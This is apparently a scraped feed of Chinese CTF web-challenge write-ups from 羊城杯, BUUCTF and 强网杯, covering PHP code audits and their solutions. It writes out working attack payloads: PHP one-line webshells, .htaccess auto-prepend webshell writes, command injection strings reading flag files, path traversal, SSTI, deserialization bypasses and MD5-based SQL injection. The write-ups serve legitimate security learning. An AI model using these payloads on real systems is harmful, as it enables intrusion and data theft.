die(&#39;谁！竟敢踩我一只耳的尾巴！&#39;); } $clandestine = getenv(&quot;clandestine&quot;); //获取一个环境变量的值 if(isset($_POST[&#39;White-cat-monitor&#39;])) $clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine); //使用 HMAC 方法生成带有密钥的哈希值 //PHP的类型自动转换，控制的变量只有One-ear和White-cat-monitor $hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine); if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){ die(&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;); } echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]); 代码的大概意思： POST传入Black-Cat-Sheriff和One-ear，绕过第一个判断POST传入White-cat-monitor，绕过第二个判断，且传入的是数组使$clandestine为NULL，即将下一个加密的密钥置空POST传入的Black-Cat-Sheriff与加密后的One-ear相同，绕过第三个判断最终执行echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);表示成功 测试一下下面这两条语句：语句1： php &gt; var_dump(hash_hmac(&#39;sha256&#39;,array(1),&#39;123&#39;)); PHP Warning: hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1 NULL post传入White-cat-monitor为数组，对White-cat-monitor加密后使得$clandestine为NULL语句2： php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;id&#39;,NULL)); string(64) &quot;58dedd736c5af324a198c6c663e569df59691854d1f53d704bdbce40f1d139c1&quot; 对post传入的One-ear进行加密，生成hash值。审计完代码后，开始做题：1、POST传入Black-Cat-Sheriff和One-ear，使Black-Cat-Sheriff与加密后的One-ear相同One-ear的值为：;cat flag.php (通过目录扫描扫到flag.php文件)Black-Cat-Sheriff的值为：One-ear加密后的值，即： php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;cat flag.php&#39;,NULL)); string(64) &quot;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&quot; Black-Cat-Sheriff的值为： 04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6 2、POST传入White-cat-monitor数组(即White-cat-monitor[]=1)使$clandestine为NULL最终得到的payload为： Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat flag.php&amp;White-cat-monitor[]=1 post传入得到flag 0x03 easyphp考点：.htaccess解析+命令注入+相关绕过打开题目，发现源码： &lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &quot;Hacker&quot;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) { echo &quot;Hacker&quot;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &quot;index.php&quot;) { unlink($file); } } } file_put_contents($filename, $content . &quot;\\nHello, world&quot;); ?&gt; 发现是2019XNUCA的easyphp原题改的，不过少了include_once(&quot;fl3g.php&quot;);，其他关键部分基本没变。所以可以参考解题。题目的大致意思： 1、通过file_put_contents函数来写马2、对我们可以控制的参数$filename和$content分别进行了preg_match函数和stristr函数的过滤，preg_match的过滤要求是输入的文件名必须只能带有[a-z\\.]范围的字符stristr函数则是过滤了on，html，type，flag，upload和file关键字3、本题环境只对index.php文件进行解析。并且开头和末尾都对当前目录下的文件进行检查，删除(unlink)除了index.php外的所有文件 解题思路根据题目的意思只解析index.php，想到以下方法：1、写入一句话木马到index.php2、写入一个.htaccess让当前目录下的所有文件都能解析为php文件3、写入一个.user.ini让index.php自动包含上我们写入的马 第一种方法是最简单的，直接写入一句话木马到index.php即可第二种方法，一定需要写多次，前面写的.htaccess会被删掉；而如果是写上开头自动包含，并且包含的文件就是.user.ini，并且在.user.ini中直接写入马，那么理论上index.php在删除前就可以执行到我们写入的马。第三种方法，利用.user.ini设置文件自动包含。这里尝试一下，没有成功。 第一种解题方法：直接写入一句话木马直接写入一句话木马到index.php ?filename=index.php&amp;content=&lt;?php eval($_POST[&#39;qwzf&#39;]); ?&gt; 蚁剑连接，找到flag即可。 第二种解题方法：利用.htaccess设置文件自动包含.htaccess设置php环境变量的格式.htaccess也可以设置开头自动包含，.htaccess设置php环境变量的格式： #format php_value setting_name setting_value #example php_value auto_prepend_file .htaccess auto_prepend_file与auto_append_file使用auto_prepend_file与auto_append_file在所有页面的顶部与底部require文件。php.ini中有两项 auto_prepend_file #在页面顶部加载文件 auto_append_file #在页面底部加载文件 使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。 绕过过滤1、绕过\\n的过滤于是确定我们要写入的文件.htaccess，文件内容为： php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt;\\ 末尾有个符号\\是必须写入的，我们注意到源代码中file_put_contents中的文件内容传入的变量$content末尾还连接上了\\nHello, world这个字符串，而\\n代表着换行，而我们再一个\\，则会拼接成\\\\n，即转义掉了n前面的\\，构不成换行。换句话来说，如果我们没有加入\\，那么写入.htaccess的文件内容就为： php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt; Hello, world 会出现末尾行的字符串不符合htaccess文件的语法标准而报错导致htaccess文件无法执行，那么当前目录下的所有文件就会面临崩溃，所以说，末尾必须写入\\ 2、绕过stristr的过滤上边写入文件.htaccess的内容里包含了file关键字，被stristr过滤，所以要绕过stristr的过滤 if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &quot;Hacker&quot;; die(); } 1.方法一：使用base64加密绕过stristr函数p神的一篇文章：谈一谈php://filter的妙用提到file_put_contents函数中的第一个参数$filename，即写入的文件名是可以控制协议的，所以我们可以用php://filter流的base64-decode方法将文件内容参数$content进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;&lt;?php&#39;)){ echo &#39;Hacker&#39;; die(); } file_put_contents($filename, $content); ?&gt; 对要写入的content进行base64编码： &gt;&gt;&gt; base64.b64encode(&#39;&lt;?php phpinfo(); ?&gt;&#39;) &#39;PD9waHAgcGhwaW5mbygpOyA/Pg==&#39; 测试payload ?filename=php://filter/write=convert.base64-decode/resource=phpinfo.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg== 访问phpinfo.php，成功显示phpinfo信息。绕过preg_match if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) { echo &quot;Hacker&quot;; die(); } 因为正则判断写的是if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1)而不是if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) !== 0) ，因此存在了被绕过的可能。 文件名写入php://filter需要绕过preg_match函数的检查。第一印象想到preg_match处理数组是会返回NULL，然而这里file_put_contents函数传入的文件名参数不支持数组的形式。看xnuca2019-ezphp的wp发现一篇文章：preg_match函数绕过思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由pcre.backtrack_limit参数来控制PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过php.ini设置，也可以通过 phpinfo页面查看。 要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置pcre.backtrack_limit值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。测试一下，是否能绕过preg_match： &lt;?php ini_set(&#39;pcre.backtrack_limit&#39;,0); var_dump(preg_match(&#39;/[^a-z\\.]/&#39;,&#39;php://filter&#39;)); ?&gt; //bool(false) 成功绕过preg_match。pcre.backtrack_limit设置的是php的环境变量，也可以在.htaccess里设置，最终写入到.htaccess中内容如下： php_value pcre.backtrack_limit 0 php_value pcre.jit 0 php_value auto_prepend_file .htaccess #a&lt;?php eval($_GET[1]); ?&gt;\\ Hello, world 因为php版本&gt;=7，所以需要特别设置pcre.jit这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得pcre.backtrack_limit这个环境变量能正常生效，绕过preg_match函数。最终payload： ?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fcHJlcGVuZF9maWxlIC5odGFjY2VzcwojYTw/cGhwIGV2YWwoJF9HRVRbMV0pOyA/Plw=&amp;1=phpinfo(); 网上都有这种方法做题，然而经过测试，并没有成功，在buu上复现xnuca2019-ezphp也没有成功。可能是环境问题。(暂时不知道是什么问题，等发现是什么问题后，再继续总结) 2.方法二：对过滤的关键字中间添加换行\\n绕过stristr函数可以通过对过滤的关键字中间添加换行\\n来绕过stristr函数的检测，不过仍然需要注意添加\\来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入.htaccess来getshellpayload如下： ?content=php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(&#39;cat%20/fla&#39;.&#39;g&#39;);?&gt;\\&amp;filename=.htaccess 写入.htaccess的内容： php_value auto_prepend_fil\\ e .htaccess #&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\\ Just one chance 然后访问index.php即可得到flag：参考：从xnuca2019-ezphp深入学习.htaccess2019XNUCA部分Web复盘 0x04 后记基本总结完毕，比赛收获了很多知识。更深一步的了解到了.htaccess解析。继续努力！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"羊城杯","slug":"羊城杯","permalink":"https://qwzf.github.io/tags/羊城杯/"}],"author":"qwzf"},{"title":"BUUCTF百题刷题总结(一)","slug":"BUUCTF百题刷题总结(一)","date":"2020-09-07T12:30:10.000Z","updated":"2020-09-14T15:58:53.656Z","comments":true,"path":"2020/09/07/BUUCTF百题刷题总结(一)/","link":"","permalink":"https://qwzf.github.io/2020/09/07/BUUCTF百题刷题总结(一)/","excerpt":"","text":"前言最近打算开始刷BUU的Web题了，之前已经刷过一些，有的总结了，有的没有总结。总结过的这里只写之前总结的链接；没总结的，原因是当时感觉有点简单，这里简单写下考察知识点和解题思路。新刷的Web题，会认真总结。BUUCTF刷题系列持续更新(SQL注入题和文件上传题单独记录)！ 0x01 [HCTF 2018]WarmUp考点：PHP代码审计+绕过自定义函数+文件包含查看源代码，发现source.php，访问发现源码 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { //白名单列表, 有source.php和hint.php $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; //!isset($page)判断$page是否未设置、!is_string($page)判断$page是否是非字符串，满足其一return false if (! isset($page) || !is_string($page)) { echo &quot;you can&#39;t see it&quot;; return false; } //in_array($page)判断$page的值是否在白名单列表$whitelist中 如果在，则为真return true if (in_array($page, $whitelist)) { return true; } //将变量$page从问号之前截取字符串(如果$page的值有?则从?之前提取字符串)并赋值给$_page $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); //第二次in_array($_page)判断$_page的值是否在白名单列表$whitelist中 如果在，则为真return true if (in_array($_page, $whitelist)) { return true; } //对$pageurl解码 $_page = urldecode($page); //第二次将变量$_page从问号之前截取字符串并赋值给$_page $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); //第三次in_array($_page)判断$_page的值是否在白名单列表$whitelist中 如果在，则为真return true if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; } } if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) { include $_REQUEST[&#39;file&#39;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 分析一下源码 1.获取POST或GET方法提交的file参数；! empty()判断是否非空、is_string()判断是否是字符串、emmm::checkFile()使用emmm类里的checkFile()函数判断，如果这三个判断全为真，远程包含file参数；否则输入题目的jpg图片2.相关函数：mb_substr() 函数返回字符串的一部分(可分割的中文文字)mb_strpos()查找字符串在另一个字符串中首次出现的位置3.在源码中添加每一步的注释 在hint.php发现flag not here, and flag in ffffllllaaaagggg于是根据代码逻辑构造payload： 先写个在白名单里的参数值如：source.php、hint.php使第一个in_array()返回true，这里我用hint.php 然后添加问号?， 截取问号之前的赋值给$_page，即hint.php使第二个in_array()返回true 最后多次跳转到上层目录，直到ffffllllaaaagggg文件，然后类里的函数返回真，包含到ffffllllaaaagggg文件。即最终结果如下： ?file=hint.php?../../../../../ffffllllaaaagggg 0x02 [极客大挑战 2019]Havefun考点：代码审计+get传参查看源代码发现泄露了关键源码 $cat=$_GET[&#39;cat&#39;]; echo $cat; if($cat==&#39;dog&#39;){ echo &#39;Syc{cat_cat_cat_cat}&#39;; } 很明显get传入?cat=dog即可得到flag 0x03 [护网杯 2018]easy_tornado考点：SSTI+tornado模板+render模板注入+获取cookie_secret题目：easy_tornadotornado是一个用Python语言写成的Web服务器兼Web应用框架。打开页面发现三个链接依次点开 file?filename=/flag.txt&amp;filehash=dd89d1c0810cfa4d496ee2284bf1a3b9 flag in /fllllllllllllag file?filename=/welcome.txt&amp;filehash=6718db2c7a20bfb11fd19222a9f1772f render file?filename=/hints.txt&amp;filehash=826794470058d90965404b4139639661 md5(cookie_secret+md5(filename)) 从上面三个文件内容可以确定flag在/fllllllllllllag文件render函数介绍对比这三个文件和url，访问文件需要把cookie_secret加上fliename的md5编码后再进行md5编码，即 file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag)) 于是，求得filehash的值，即可得到flag。求得filehash前需要得到cookie_secret。经测试，存在模板注入查阅资料得知 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settingshandler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings所以handler.settings就指向RequestHandler.application.settings了，这里面是一些环境变量 参考：python SSTI tornado render模板注入于是传入error?msg={{handler.settings}}得到cookie_secret于是将cookie_secret代入md5(cookie_secret+md5(/fllllllllllllag))，并求得filehash的值。可通过md5加密在线网站，也可通过下面脚本得到： import hashlib def md5(s): md5 = hashlib.md5() md5.update(s.encode(&quot;utf8&quot;)) return md5.hexdigest() def filehash(): filename = &#39;/fllllllllllllag&#39; cookie_secret = &#39;738a090d-07f8-4893-890b-de0eb10093cd&#39; print(md5(cookie_secret+md5(filename))) if __name__ == &#39;__main__&#39;: filehash() 跑脚本得到filehash的值：a7f620001b50f75242ff6d6ac63addc0于是最终payload是 file?filename=/fllllllllllllag&amp;filehash=a7f620001b50f75242ff6d6ac63addc0 0x04 [RoarCTF 2019]Easy Calc考点：HTTP请求走私+PHP字符串解析特性+一些函数一些函数：scandir()函数、readfile()函数、base_convert()函数、dechex() 函数、hex2bin() 函数（chr()函数）从一道题到HTTP请求走私 0x05 [极客大挑战 2019]Secret File考点：burp重放+文件包含+伪协议先查看源代码，发现./Archive_room.php点击SECRET(即访问action.php)时，使用 burp抓包，重放得到secr3t.php，访问得到： &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#39;file&#39;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里 ?&gt; stristr()函数搜索字符串在另一字符串中的第一次出现简单理解下，代码逻辑。很明显不用考虑那么多，直接构造payload： ?file=flag.php 发现读取flag.php成功，但没有显示。于是考虑使用php伪协议读取即可 ?file=php://filter/convert.base64-encode/resource=flag.php 得到Base64编码的flag，解码即可得到flag 0x06 [ACTF2020 新生赛]Include考点：文件包含+伪协议点击tips，发现url增加了?file=flag.php，访问结果是Can you find out the flag?。看到?file=flag.php，第一印象可以想到文件包含，因为又没显示flag，所以接下来想到使用伪协议读取flag.php文件，最终payload: ?file=php://filter/convert.base64-encode/resource=flag.php 得到Base64编码的flag，解码即可得到flag PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NWRkNzM4NDYtOGNkYS00NjU3LWE4MTgtYzY4MzJiNzUzODAwfQo= 0x07 [HCTF 2018]admin考点：flask session 伪造+unicode欺骗+条件竞争由于暂时还没学 flask框架，暂不总结后续补上。 0x08 [GXYCTF2019]Ping Ping Ping考点： 命令执行+绕过空格+绕过黑名单(也可内敛执行绕过)之前博客：命令执行绕过的练习(一) 0x09 [极客大挑战 2019]Knife考点：中国菜刀、蚁剑等 shelll管理工具的使用题目直接给了一句话木马和密码eval($_POST[&quot;Syc&quot;]);。直接使用蚁剑连接即可，flag在/flag 0x10 [极客大挑战 2019]PHP考点：源码泄露+代码审计+PHP反序列化+private声明字段+绕过__wakeup()函数一进题目发现里边写了一句话： 因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯不愧是我！！！ 很明显是源码泄露，备份了网站，第一印象想到备份在www.zip。测试之后，果然是，于是下载源码源码里发现 flag.php文件，里边的 flag不对。应该只是为了说明flag文件的位置，在网站上想办法读取。于是在index.php和class.php文件里发现源码index.php &lt;?php include &#39;class.php&#39;; $select = $_GET[&#39;select&#39;]; $res=unserialize(@$select); ?&gt; 审计index.php： 包含class.php文件get传入select参数，然后赋值给$select变量对$select变量进行反序列化后，赋值给$res变量 class.php &lt;?php include &#39;flag.php&#39;; error_reporting(0); class Name{ private $username = &#39;nonono&#39;; private $password = &#39;yesyes&#39;; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = &#39;guest&#39;; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === &#39;admin&#39;) { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;; die(); } } } ?&gt; 1、public、protected与private在序列化时的区别1.protectedprotected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。（1）序列化时，字段名前面会加上\\0*\\0的前缀,即0*\\0字段名。\\0表示ASCII 码为0的字符(不可见字符)，用python传值（2）序列化时，格式是%00*%00字段名，普通传值2.privateprivate 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。（1）序列化时，类名和字段名前面都会加上\\0的前缀，即\\0类名\\0字段名。字符串长度也包括所加前缀的长度（2）序列化时，格式是%00类名%00字段名，普通传值 2、__wakeup()方法绕过(CVE-2016-7124)1.作用： 与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。2.绕过： 当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过__wakeup()函数的执行。审计class.php： 包含flag.php文件，文件里$flag变量的值是flag定义一个Name类，使用private声明私有成员变量$username和$password并赋初值创建对象，调用构造函数 construct()，销毁对象，调用析构函数destruct() __wakeup()在反序列化时，被自动调用。 分析一下，析构函数里的代码逻辑： password=100绕过第一个if条件 username=’admin’满足第二个if条件，定义全局变量$flag，输出$flag 所以需要password=100且username=&#39;admin&#39;。由于在反序列化时，会调用__wakeup()函数，使username的值被覆盖成guest。通过设置属性个数的值，使属性个数的值大于真实属性个数进行绕过。 于是构造exp进行序列化： &lt;?php class Name{ private $username = &#39;admin&#39;; private $password = 100; } $class1 = new Name; $class1_ser = serialize($class1); print_r($class1_ser); ?&gt; 得到 O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;} 根据private 声明的字段特点：序列化时格式是%00类名%00字段名使属性个数的值大于真实属性个数绕过__wakeup()函数，即将第一个Name后的2改为大于2的数如：3修改得到payload： O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} get传参，参数是select，参数值是上边的这个。得到flag 0x11 [ACTF2020 新生赛]Exec考点：命令执行+ping环境 target=|find / -name flag* #找到flag位置：/flag target=|cat /flag #得到flag 0x12 [极客大挑战 2019]Http考点：HTTP请求头流量包伪造查看源代码发现Secret.php，访问得到It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;1.伪造Referer：使用Burp抓包伪造即可(下同) Referer: https://www.Sycsecret.com 得到Please use &quot;Syclover&quot; browser2.伪造UA于是伪造浏览器，通过修改UA的最后边浏览器标识进行伪造。得到No!!! you can only read this locally!!!，于是伪造IP3.伪造IP可通过伪造XFF、Client-IP等 X-Forwarded-For: 127.0.0.1 发包，最终得到 flag 0x13 [ACTF2020 新生赛]BackupFile考点：源码泄露+代码审计+PHP弱类型看到题目标题BackupFile，很容易想到存在源码泄露，且源码是.bak结尾的文件。于是尝试访问index.php.bak，发现可以下载源码，内容是： &lt;?php include_once &quot;flag.php&quot;; if(isset($_GET[&#39;key&#39;])) { $key = $_GET[&#39;key&#39;]; if(!is_numeric($key)) { exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; } } else { echo &quot;Try to find out source file!&quot;; } 审计一下代码逻辑： 包含flag.php文件1.如果get传参传入了参数key，将参数值赋值给变量$key2.如果$key的值是非数字，输出Just num!结束；获取$key的整数值再赋值给$key3.如果$key == $str输出flag。使用的是==，在进行比较的时候，会先将字符串类型转化成相同再比较 于是可以构造出payload： ?key=123 #访问得到flag 0x14 [极客大挑战 2019]BuyFlag考点：PHP弱类型点击MENU，选择PAYFLAG，查看源代码得到： ~~~post money and password~~~ if (isset($_POST[&#39;password&#39;])) { $password = $_POST[&#39;password&#39;]; if (is_numeric($password)) { echo &quot;password can&#39;t be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; } } 根据代码意思 1.需要post传money和password参数2.根据题目money等于1000000003.password利用is_numeric()函数判断不能是数字，且password等于404很明显考察弱类型绕过is_numeric()函数 绕过is_numeric()函数的方法有：加%00、%20、%0d、%0a、|、;等等于是构造payload money=100000000&amp;password=404%00 测试发现，没反应。根据提示Only Cuit&#39;s students can buy the FLAG，应该需要观察Cookie，发现Cookie: user=0，将0改为1重新发包。得到you are CuiterPassword Right!Nember lenth is too long意思就是Nember的长度太长了，也就是传入的money参数太大了。也发现PHP的版本是PHP/5.3.3，猜测一下可能通过strcmp()函数进行比较，即 strcmp($_POST[&#39;money&#39;],100000000)==0 利用strcmp()函数的松散性，传入数组返回NULL，即变成了NULL==0，为真。于是可以传入数组money[]=1，使得上面比较为真最终payload： Cookie: user=1 post传参： money[]=1&amp;password=404%00 0x15 [ZJCTF 2019]NiZhuanSiWei考点：代码审计+伪协议+文件包含+PHP反序列化打开题目，发现源码 &lt;?php $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){ echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;Not now!&quot;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?&gt; 代码审计一下： 1.get传入text、file和password并赋值给相应变量。如果设置了text，且text的文件内容为welcome to the zjctf，输出text的文件内容2.如果file传入的值(即$file)含有flag，输出Not now!，结束；否则包含$file，$password进行反序列化并输出 于是有以下思路： text=php://input //利用伪协议，将post传入值当作文件内容 post: welcome to the zjctf file=php://filter/read=convert.base64-encode/resource=useless.php //利用伪协议读文件内容 password=1 //待定，先设为1。猜测useless.php存在反序列化漏洞 get传参访问，得到base64编码后的useless.php的文件内容。Base64解码得到： &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 很明显存在反序列化漏洞，于是构造poc： &lt;?php class Flag{ //flag.php public $file=&quot;flag.php&quot;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } $test1=new Flag; print_r(serialize($test1)); ?&gt; 由poc生成exp: O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 最终得到payload： ?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} post：welcome to the zjctf 传入参数，访问，查看源代码发现flag。 后记百题刷题记录总结持续更新。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://qwzf.github.io/tags/BUUCTF/"}],"author":"qwzf"},{"title":"2020强网杯部分题总结与复现","slug":"2020强网杯部分题总结与复现","date":"2020-08-31T15:46:04.649Z","updated":"2020-08-31T15:50:19.094Z","comments":true,"path":"2020/08/31/2020强网杯部分题总结与复现/","link":"","permalink":"https://qwzf.github.io/2020/08/31/2020强网杯部分题总结与复现/","excerpt":"","text":"0x00 前言前几天打了个两天一夜的强网杯比赛，整个人都快要起飞了。趁着闲暇之余，总结和复现一下部分题。 0x01 强网先锋：主动考点：命令执行+绕过黑名单题目源码： &lt;?php highlight_file(&quot;index.php&quot;); if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;])) { die(&quot;no flag&quot;); } system(&quot;ping -c 3 $_GET[ip]&quot;); ?&gt; 很简单的一个过滤了flag关键字的命令执行，，直接拼接绕过即可：payload ?ip=|ls ?ip=;a=g;cat fla$a.php 0x02 强网先锋：Funhash考点：magic hash+弱类型题目源码： &lt;?php include &#39;conn.php&#39;; highlight_file(&quot;index.php&quot;); //level 1 if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])) { die(&#39;level 1 failed&#39;); } //level 2 if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;])) { die(&#39;level 2 failed&#39;); } //level 3 $query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;; $result = $mysqli-&gt;query($query); $row = $result-&gt;fetch_assoc(); var_dump($row); $result-&gt;free(); $mysqli-&gt;close(); ?&gt; 一共三关： level1：绕过$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]) level2：绕过$_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]) level3：绕过SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39; 第一关：level1level1的意思是：找到一个值，md4加密前后相等，才能绕过。谷歌搜索得到相关知识：HSCTF 2019: MD5–主要就是利用了PHP的特性，绕过hash1。里边有一个暴力破解PHP脚本： $i = 0; $c = 0; while (true) { if ((++$c % 1000000) == 0) { printf(&quot;.&quot;); } $n = &quot;0e&quot; . $i++; $h = hash(&#39;md4&#39;, $n); if ($n == $h) { printf(&quot;\\nFound: $n\\n&quot;); break; } } $i每次迭代数值加1，然后对生成的0e前缀字符串$n进行哈希处理和比较。字符串从0e1开始，然后继续进行，直到找到匹配项为止。每百万次迭代将一个点打印到屏幕上标记进度。运行一段时间得到第一个正确的0e字符串： Found: 0e251288019 pyload1 ?hash1=0e251288019 然后就成功绕过了level1。第二关：level2level2的意思是：(用了===)让传入的两个值不相等且md5加密后相等，才能绕过。利用md5无法处理数组的特性，使用数组绕过pyload2 ?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3 第三关：level3level3的意思是：绕过md5($_GET[&quot;hash4&quot;],true)实现SQL注入。 利用字符串：ffifdyop md5后，276f722736c95d99e921722cf9ed621c 再转成字符串： &#39;or&#39;6 最终pyload: 